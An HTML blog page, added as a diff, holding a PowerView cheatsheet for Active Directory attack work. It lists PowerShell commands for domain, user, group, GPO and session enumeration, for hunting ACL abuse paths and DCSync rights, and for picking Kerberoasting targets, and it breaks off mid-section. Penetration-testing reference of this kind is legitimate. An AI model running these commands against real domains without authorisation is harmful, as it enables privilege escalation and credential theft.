@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <!-- ══════════════ PRIMARY META ══════════════ -->
+  <title>PowerView | Zirov</title>
+  <meta name="description" content="Complete PowerView cheatsheet for Active Directory enumeration and post-exploitation. Covers domain and forest reconnaissance, user and group enumeration, computer discovery, GPO and ACL analysis, trust mapping, delegation abuse (unconstrained, constrained and RBCD), privilege escalation paths via ACE hunting, AdminSDHolder and managed security groups, persistence techniques including DCSync rights, SPN manipulation, forced password resets and DACL backdoors, session hunting with Invoke-UserHunter, and BloodHound data collection. Every command includes context on when to use it, what privileges it requires and what you can do with the output. Built for penetration testers and red teamers operating in real Active Directory environments." />
+  <meta name="author"      content="Zirov" />
+  <meta name="robots"      content="index, follow" />
+  <meta name="keywords"    content="powerview, active directory, enumeration, powershell, AD, cheatsheet, pentesting, ctf, post-exploitation, delegation, persistence, acl-abuse, dcsync, kerberoast, asreproast, bloodhound, privilege-escalation" />
+  <link rel="canonical"    href="https://zirov.xyz/notes/powerview.html" />
+
+  <!-- ══════════════ OPEN GRAPH ══════════════ -->
+  <meta property="og:type"                content="article" />
+  <meta property="og:title"               content="PowerView | Zirov" />
+  <meta property="og:description"         content="Complete PowerView cheatsheet for Active Directory enumeration and post-exploitation. Covers domain and forest reconnaissance, user and group enumeration, computer discovery, GPO and ACL analysis, trust mapping, delegation abuse (unconstrained, constrained and RBCD), privilege escalation paths via ACE hunting, AdminSDHolder and managed security groups, persistence techniques including DCSync rights, SPN manipulation, forced password resets and DACL backdoors, session hunting with Invoke-UserHunter, and BloodHound data collection. Every command includes context on when to use it, what privileges it requires and what you can do with the output. Built for penetration testers and red teamers operating in real Active Directory environments." />
+  <meta property="og:url"                 content="https://zirov.xyz/notes/powerview.html" />
+  <meta property="og:site_name"           content="Zirov" />
+  <meta property="og:image"              content="https://zirov.xyz/img/powerview.png" />
+  <meta property="og:image:width"        content="1200" />
+  <meta property="og:image:height"       content="630" />
+  <meta property="og:image:alt"          content="PowerView — Zirov" />
+  <meta property="og:locale"             content="en_US" />
+  <meta property="article:author"         content="Zirov" />
+  <meta property="article:published_time" content="2025-01-01" />
+  <meta property="article:tag" content="Active Directory">
+  <meta property="article:tag" content="Enumeration">
+  <meta property="article:tag" content="Notes">
+  <meta property="article:tag" content="PowerShell">
+  <meta property="article:tag" content="Delegation">
+  <meta property="article:tag" content="Persistence">
+  <meta property="article:tag" content="ACL Abuse">
+  <meta property="article:tag" content="Privilege Escalation">
+  <meta property="article:tag" content="BloodHound">
+
+  <!-- ══════════════ TWITTER CARD ══════════════ -->
+  <meta name="twitter:card"        content="summary_large_image" />
+  <meta name="twitter:title"       content="PowerView | Zirov" />
+  <meta name="twitter:description" content="Complete PowerView cheatsheet for Active Directory enumeration and post-exploitation. Covers domain and forest reconnaissance, user and group enumeration, computer discovery, GPO and ACL analysis, trust mapping, delegation abuse (unconstrained, constrained and RBCD), privilege escalation paths via ACE hunting, AdminSDHolder and managed security groups, persistence techniques including DCSync rights, SPN manipulation, forced password resets and DACL backdoors, session hunting with Invoke-UserHunter, and BloodHound data collection. Every command includes context on when to use it, what privileges it requires and what you can do with the output. Built for penetration testers and red teamers operating in real Active Directory environments." />
+  <meta name="twitter:image"       content="https://zirov.xyz/img/powerview.png" />
+  <meta name="twitter:image:alt"   content="PowerView — Zirov" />
+
+  <!-- ══════════════ SCHEMA.ORG ══════════════ -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "TechArticle",
+    "headline": "PowerView",
+    "description": "Complete PowerView cheatsheet for Active Directory enumeration and post-exploitation. Covers domain and forest reconnaissance, user and group enumeration, computer discovery, GPO and ACL analysis, trust mapping, delegation abuse (unconstrained, constrained and RBCD), privilege escalation paths via ACE hunting, AdminSDHolder and managed security groups, persistence techniques including DCSync rights, SPN manipulation, forced password resets and DACL backdoors, session hunting with Invoke-UserHunter, and BloodHound data collection. Every command includes context on when to use it, what privileges it requires and what you can do with the output. Built for penetration testers and red teamers operating in real Active Directory environments.",
+    "image": "https://zirov.xyz/img/powerview.png",
+    "author": {
+      "@type": "Person",
+      "name": "Zirov",
+      "url": "https://zirov.xyz/page/profile.html"
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Zirov",
+      "url": "https://zirov.xyz/"
+    },
+    "datePublished": "2025-01-01",
+    "dateModified":  "2025-01-01",
+    "url": "https://zirov.xyz/notes/powerview.html",
+    "keywords": ["Active Directory", "Enumeration", "Notes", "PowerShell", "Delegation", "Persistence", "ACL Abuse", "Privilege Escalation", "BloodHound"],
+    "articleSection": "Notes",
+    "inLanguage": "en"
+  }
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=Outfit:wght@400;500;600;700;800&family=Barlow:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/styles.css">
+  <link rel="stylesheet" href="../css/search.css">
+  <link rel="stylesheet" href="../css/post.css">
+</head>
+<body>
+  <div class="menu-overlay" id="menuOverlay"></div>
+  <aside class="side-menu" id="sideMenu">
+    <div class="menu-profile">
+      <img src="../img/profile.png" class="menu-avatar" alt="Zirov" onerror="this.style.display='none'">
+      <h3 class="menu-name">Ziro<em>v</em></h3>
+      <p class="menu-bio">Security Researcher · CTF Player · Blogger</p>
+    </div>
+    <div class="menu-nav-wrapper">
+      <nav class="menu-nav">
+        <a href="/" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg><span>Home</span></a>
+        <a href="../page/profile.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><span>Zirov</span></a>
+        <a href="../page/archives.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"/></svg><span>Archives</span></a>
+        <a href="../page/notes.html" class="menu-link active"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"/></svg><span>Notes</span></a>
+        <a href="../page/tags.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 7h.01M7 3h5c.512 0 1.024.195 1.414.586l7 7a2 2 0 010 2.828l-7 7a2 2 0 01-2.828 0l-7-7A1.994 1.994 0 013 12V7a4 4 0 014-4z"/></svg><span>Tags</span></a>
+        <a href="../page/projects.html" class="menu-link"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 012-2h4l2 2h8a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/></svg><span>Projects</span></a>
+      </nav>
+      <nav class="menu-nav menu-nav-secondary">
+        <a href="https://youtube.com/@zirovsec" target="_blank" rel="noopener noreferrer" class="menu-link menu-link-secondary"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg><span>YouTube</span></a>
+        <a href="https://twitch.tv/zirovsec" target="_blank" rel="noopener noreferrer" class="menu-link menu-link-secondary"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.571 4.714h1.715v5.143H11.57zm4.715 0H18v5.143h-1.714zM6 0L1.714 4.286v15.428h5.143V24l4.286-4.286h3.428L22.286 12V0zm14.571 11.143l-3.428 3.428h-3.429l-3 3v-3H6.857V1.714h13.714Z"/></svg><span>Twitch</span></a>
+        <a href="https://discord.gg/PBq8YBsq" target="_blank" rel="noopener noreferrer" class="menu-link menu-link-secondary"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg><span>Discord</span></a>
+      </nav>
+    </div>
+    <div class="menu-social-strip">
+      <a href="https://github.com/z1rov" target="_blank" rel="noopener" class="menu-social-link" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"/></svg></a>
+      <a href="https://www.linkedin.com/in/fabian-g-huamani" target="_blank" rel="noopener" class="menu-social-link" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452z"/></svg></a>
+      <a href="https://profile.hackthebox.com/profile/019c52fc-d8cf-7339-9385-c0d96f6f7efb" target="_blank" rel="noopener" class="menu-social-link" aria-label="HackTheBox"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.996 0a1.119 1.119 0 0 0-.057.003.9.9 0 0 0-.236.05.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77v11.111a.889.889 0 0 0 .47.784l9.598 5.541.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.026.01.001.011.003.016.004a.93.93 0 0 0 .296.015.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.026l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.026c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .726l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.726l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.526 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.261.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532a.42.42 0 0 1-.208.362l-6.526 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z"/></svg></a>
+      <a href="mailto:fabian.huamani@ucsm.edu.pe" class="menu-social-link" aria-label="Email"><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"/></svg></a>
+    </div>
+  </aside>
+  <header class="topbar">
+    <button class="hamburger" id="hamburgerBtn" aria-label="Open menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="15" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+    <a class="logo-wrap" href="/"><svg class="logo-icon" viewBox="-0.5 -0.5 262 270" xmlns="http://www.w3.org/2000/svg"><path fill="#c82525" d="M -0.5,-0.5 C 86.8333,-0.5 174.167,-0.5 261.5,-0.5C 261.5,89.5 261.5,179.5 261.5,269.5C 174.167,269.5 86.8333,269.5 -0.5,269.5C -0.5,179.5 -0.5,89.5 -0.5,-0.5 Z"/><path fill="#f9f8f8" d="M 121.5,149.5 C 120.244,149.461 119.244,149.961 118.5,151C 143.831,151.5 169.164,151.667 194.5,151.5C 194.5,159.167 194.5,166.833 194.5,174.5C 151.167,174.5 107.833,174.5 64.5,174.5C 64.169,166.472 64.5023,158.472 65.5,150.5C 90.1104,140.298 114.777,130.298 139.5,120.5C 140.289,120.217 140.956,119.717 141.5,119C 115.835,118.5 90.1688,118.333 64.5,118.5C 64.5,110.833 64.5,103.167 64.5,95.5C 108.167,95.5 151.833,95.5 195.5,95.5C 195.831,103.528 195.498,111.528 194.5,119.5C 170.143,129.506 145.809,139.506 121.5,149.5 Z"/></svg><span class="logo-text">Ziro<em>v</em></span></a>
+    <div class="topbar-right">
+      <button class="icon-btn search-btn" aria-label="Search" id="search-toggle"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></button>
+      <button class="icon-btn" id="themeBtn" aria-label="Toggle theme">
+        <svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+        <svg class="i-sun"  viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2m0 16v2M4.93 4.93l1.41 1.41m11.32 11.32 1.41 1.41M2 12h2m16 0h2M4.93 19.07l1.41-1.41m11.32-11.32 1.41-1.41"/></svg>
+      </button>
+      <a href="https://discord.gg/PBq8YBsq" target="_blank" rel="noopener" class="btn-join">
+        <svg viewBox="0 0 24 24" fill="currentColor" style="width:12px;height:12px;flex-shrink:0"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057c.002.022.015.043.031.051a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028 14.09 14.09 0 0 0 1.226-1.994.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
+        Join Discord
+      </a>
+      <a href="../page/profile.html" class="avatar"><img src="../img/profile.png" alt="Zirov" onerror="this.style.display='none'"></a>
+    </div>
+  </header>
+  <div class="ticker"><div class="ticker-track" id="tickerTrack"></div></div>
+  <main class="layout">
+    <article class="col-featured post-article">
+      <header class="post-header">
+        <div class="post-breadcrumb">
+          <a href="/">Home</a><span class="sep">›</span>
+          <a href="/page/notes.html">Notes</a><span class="sep">›</span>
+          <span>PowerView</span>
+        </div>
+        <h1 class="post-title">PowerView</h1>
+        <div class="post-meta">
+          <span class="post-date"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Jan 01, 2025</span>
+          <span class="post-dot">·</span>
+          <span class="post-words"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg><span>1,796 words</span></span>
+          <span class="post-dot">·</span>
+          <span class="post-readtime"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:11px;height:11px;opacity:0.6;flex-shrink:0;vertical-align:middle;margin-right:4px"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>9 min</span></span>
+        </div>
+        <div class="post-tags"><a href="/page/tags.html#active-directory" class="tag">Active Directory</a>
+                  <a href="/page/tags.html#enumeration" class="tag">Enumeration</a>
+                  <a href="/page/tags.html#notes" class="tag">Notes</a>
+                  <a href="/page/tags.html#powershell" class="tag">PowerShell</a>
+                  <a href="/page/tags.html#delegation" class="tag">Delegation</a>
+                  <a href="/page/tags.html#persistence" class="tag">Persistence</a>
+                  <a href="/page/tags.html#acl-abuse" class="tag">ACL Abuse</a>
+                  <a href="/page/tags.html#privilege-escalation" class="tag">Privilege Escalation</a>
+                  <a href="/page/tags.html#bloodhound" class="tag">BloodHound</a></div>
+      </header>
+      <img class="post-cover" src="https://zirov.xyz/img/powerview.png" alt="PowerView cover" onerror="this.style.display='none'"/>
+      <div class="post-content">
+<blockquote>
+<p>Modern <code>Get-Domain*</code> names preferred. Legacy <code>Get-Net*</code> aliases coexist in most builds.</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Legacy</th>
+<th>Modern</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Get-NetDomain</code></td>
+<td><code>Get-Domain</code></td>
+<td>Domain information via LDAP</td>
+</tr>
+<tr>
+<td><code>Get-NetUser</code></td>
+<td><code>Get-DomainUser</code></td>
+<td>Modern has better filtering/properties</td>
+</tr>
+<tr>
+<td><code>Get-NetGroup</code></td>
+<td><code>Get-DomainGroup</code></td>
+<td>Domain group enumeration</td>
+</tr>
+<tr>
+<td><code>Get-NetComputer</code></td>
+<td><code>Get-DomainComputer</code></td>
+<td>Computer object enumeration</td>
+</tr>
+<tr>
+<td><code>Get-NetGPO</code></td>
+<td><code>Get-DomainGPO</code></td>
+<td>Group Policy enumeration</td>
+</tr>
+<tr>
+<td><code>Get-ObjectAcl</code></td>
+<td><code>Get-DomainObjectAcl</code></td>
+<td>ACL/ACE enumeration</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumeration">ENUMERATION</h2>
+<h3 id="domain-info">Domain Info</h3>
+<p>The SID is required for Golden/Silver Ticket attacks. Mandatory entry point.</p>
+<pre><code class="lang-powershell">Get-Domain
+Get-Domain -Domain zirov.local
+Get-DomainSID
+Get-DomainController
+Get-DomainController -Domain zirov.local
+</code></pre>
+<h3 id="domain-policy">Domain Policy</h3>
+<p>Review before brute-forcing — check lockout threshold and Kerberos settings.</p>
+<pre><code class="lang-powershell">Get-DomainPolicy
+(Get-DomainPolicy).&quot;system access&quot;
+(Get-DomainPolicy).&quot;kerberos policy&quot;
+</code></pre>
+<h3 id="users">Users</h3>
+<p>Low <code>logoncount</code> + old <code>pwdlastset</code> = possible honeypot. Check descriptions — they're often full of passwords.</p>
+<pre><code class="lang-powershell">Get-DomainUser
+Get-DomainUser -Identity genarov69
+Get-DomainUser -Properties samaccountname,pwdlastset,logoncount,badpwdcount
+Get-DomainUser -LDAPFilter &quot;(description=*pass*)&quot;
+</code></pre>
+<h3 id="groups">Groups</h3>
+<p>Always recurse — nested membership is where real attack paths hide.</p>
+<pre><code class="lang-powershell">Get-DomainGroup
+Get-DomainGroup *admin*
+Get-DomainGroupMember -Identity &quot;Domain Admins&quot; -Recurse
+Get-DomainGroupMember -Identity &quot;Enterprise Admins&quot; -Domain zirov.local -Recurse
+Get-DomainGroup -UserName &quot;genarov69&quot;
+Get-DomainManagedSecurityGroup | Select GroupName,ManagerName
+</code></pre>
+<h3 id="computers">Computers</h3>
+<p>Filter by OS or pull full attributes to identify high-value targets.</p>
+<pre><code class="lang-powershell">Get-DomainComputer
+Get-DomainComputer -OperatingSystem &quot;*Server 2019*&quot;
+Get-DomainComputer -Properties dnshostname,operatingsystem,lastlogontimestamp
+</code></pre>
+<h3 id="organizational-units">Organizational Units</h3>
+<p>Look for OUs with linked GPOs — common privesc path via GPO abuse.</p>
+<pre><code class="lang-powershell">Get-DomainOU
+Get-DomainOU -Properties name,gplink,distinguishedname
+Get-DomainOU | Where-Object { $_.gplink -ne $null }
+</code></pre>
+<p>Map an OU to its linked GPO:</p>
+<pre><code class="lang-powershell">$ou = Get-DomainOU -Identity &quot;Servers&quot;
+$gplink = $ou.gplink -replace '.*\{(.*?)\}.*','$1'
+Get-DomainGPO -Identity &quot;{$gplink}&quot;
+</code></pre>
+<h3 id="dns">DNS</h3>
+<p>Useful for discovering internal services, shares, DFS, and non-standard hosts.</p>
+<pre><code class="lang-powershell">Get-DomainDNSZone
+Get-DomainDNSZone -Domain zirov.local
+Get-DomainDNSRecord -ZoneName zirov.local
+Get-DomainDNSRecord -ZoneName zirov.local | Where-Object { $_.RecordType -eq &quot;A&quot; }
+</code></pre>
+<h3 id="gpos">GPOs</h3>
+<p>Look for recently modified GPOs or GPOs that push users into local groups.</p>
+<pre><code class="lang-powershell">Get-DomainGPO
+Get-DomainGPO | Select displayname,whenchanged
+Get-DomainGPO -ComputerIdentity zirov-dc.zirov.local
+Get-DomainGPOLocalGroup
+Get-DomainGPOUserLocalGroupMapping -Identity &quot;genarov69&quot;
+Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity zirov-dc.zirov.local
+</code></pre>
+<h3 id="active-sessions">Active Sessions</h3>
+<p><code>Get-NetLoggedon</code> requires local admin. <code>Get-LoggedonLocal</code> uses remote registry (Server OS only). Both are noisy — avoid mass use on monitored networks.</p>
+<pre><code class="lang-powershell">Get-NetLoggedon -ComputerName zirov-dc.zirov.local
+Get-LoggedonLocal -ComputerName zirov-dc.zirov.local
+Get-LastLoggedon -ComputerName zirov-dc.zirov.local
+</code></pre>
+<h3 id="local-groups-shares">Local Groups &amp; Shares</h3>
+<p><code>Find-LocalAdminAccess</code> is extremely noisy and triggers EDR. Prefer SharpHound LocalAdmin collection in monitored environments.</p>
+<pre><code class="lang-powershell">Find-LocalAdminAccess -Verbose
+Get-NetLocalGroup -ComputerName zirov-dc.zirov.local -ListGroups
+Invoke-ShareFinder -Verbose
+Find-InterestingDomainShareFile -Verbose
+Get-NetFileServer
+</code></pre>
+<h2 id="acl-abuse">ACL ABUSE</h2>
+<h3 id="enumerate-acls">Enumerate ACLs</h3>
+<p>Always resolve GUIDs or the output is unreadable. SYSVOL is world-readable by default.</p>
+<pre><code class="lang-powershell">Get-DomainObjectAcl -Identity genarov69 -ResolveGUIDs
+Get-DomainObjectAcl -Identity &quot;Domain Admins&quot; -ResolveGUIDs
+(Get-Acl &quot;AD:\CN=Administrator,CN=Users,DC=zirov,DC=local&quot;).Access
+Get-PathAcl -Path &quot;\\zirov-dc.zirov.local\sysvol&quot;
+</code></pre>
+<h3 id="broad-ace-scan">Broad ACE Scan</h3>
+<p>Full LDAP sweep — noisy in large environments. Filter out legitimate trustees to reduce noise.</p>
+<pre><code class="lang-powershell">Invoke-ACLScanner -ResolveGUIDs
+Find-InterestingDomainAcl -ResolveGUIDs | Select IdentityReferenceName,ObjectDN,ActiveDirectoryRights
+</code></pre>
+<h3 id="targeted-ace-hunting">Targeted ACE Hunting</h3>
+<p>Look for WriteDACL, GenericAll, GenericWrite on a specific object.</p>
+<pre><code class="lang-powershell">Get-DomainObjectAcl -Identity &quot;Domain Admins&quot; -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match &quot;WriteProperty|GenericWrite|GenericAll|WriteDacl&quot;
+}
+</code></pre>
+<h3 id="forcechangepassword">ForceChangePassword</h3>
+<p>Direct access to the account without knowing the current password.</p>
+<pre><code class="lang-powershell">Invoke-ACLScanner -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match &quot;User-Force-Change-Password&quot;
+}
+</code></pre>
+<h3 id="writedacl">WriteDACL</h3>
+<p>Allows granting yourself any right over the target object.</p>
+<pre><code class="lang-powershell">Invoke-ACLScanner -ResolveGUIDs | Where-Object {
+    $_.ActiveDirectoryRights -match &quot;WriteDacl&quot;
+}
+</code></pre>
+<h3 id="dcsync-rights">DCSync Rights</h3>
+<p>Find who has replication rights outside of legitimate holders.</p>
+<pre><code class="lang-powershell">Get-DomainObjectAcl -Identity &quot;DC=zirov,DC=local&quot; -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match &quot;DS-Replication-Get-Changes&quot; -and
+    $_.IdentityReferenceName -notmatch &quot;Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|SYSTEM&quot;
+}
+</code></pre>
+<h2 id="kerberos-attacks">KERBEROS ATTACKS</h2>
+<h3 id="kerberoasting">Kerberoasting</h3>
+<p>Users with SPNs — request a TGS and crack offline. Filter by high-value services first.</p>
+<pre><code class="lang-powershell">Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
+Get-DomainUser -SPN | Where-Object { $_.serviceprincipalname -match &quot;MSSQLSvc|http|exchange&quot; }
